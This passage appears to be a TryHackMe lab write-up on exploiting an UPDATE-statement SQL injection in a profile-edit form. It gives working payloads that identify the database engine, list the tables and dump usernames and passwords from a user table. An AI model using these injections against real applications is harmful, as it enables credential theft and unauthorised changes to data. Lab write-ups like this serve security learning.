- Went to `Edit Profile` image. This might be vulnerable to UPDATE SQL Injection.
- On looking at its source code found the name of fields as `nickName`,`email`,and `password`, these can be potential column names .

```html
<div class="login-form">
    <form action="/sesqli1/profile" method="post">
        <h2 class="text-center">Edit Francois's Profile Information</h2>
        <div class="form-group">
            <label for="nickName">Nick Name:</label>
            <input type="text" class="form-control" placeholder="Nick Name" id="nickName" name="nickName" value="test">
        </div>
        <div class="form-group">
            <label for="email">E-mail:</label>
            <input type="text" class="form-control" placeholder="E-mail" id="email" name="email" value="">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" class="form-control" placeholder="Password" id="password" name="password">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Change</button>
        </div>
        <div class="clearfix">
            <label class="pull-left checkbox-inline"></label>
        </div>
    </form>
</div>
```

- Changed Nick Name to `1', nickName='test1', email='1234' -- -`
- Updated data.
- In the home page the nick name of the user is changed to `test1` and email to `1234`.
![new profile data](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/3.png).

- Now we can try to find databases that the back-end is using

```console
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='
```

- Tried uploading first two payloads, but the data didn't change, but on uploading 3rd payload the Nick Name field changed to `3.22.0`
![new profile data](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/4.png) 
- So we know that the database is `SQLite`.
- Added SQL injection `',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='` payload to the nick name field and updated data.
- New update query would be
```SQL
UPDATE usertable SET nickName='',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='',email='1234' WHERE UID='1'
```
![new profile data](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/5.png) 
- Got the table name `usertable`.
- Then we can extract usernames from the table `usertable`.

```SQL
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```
![new profile data](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/6.png)
- Now we can extract column values from the table

```SQL
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
```
- Got user Data
![usertable data](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/7.png) 
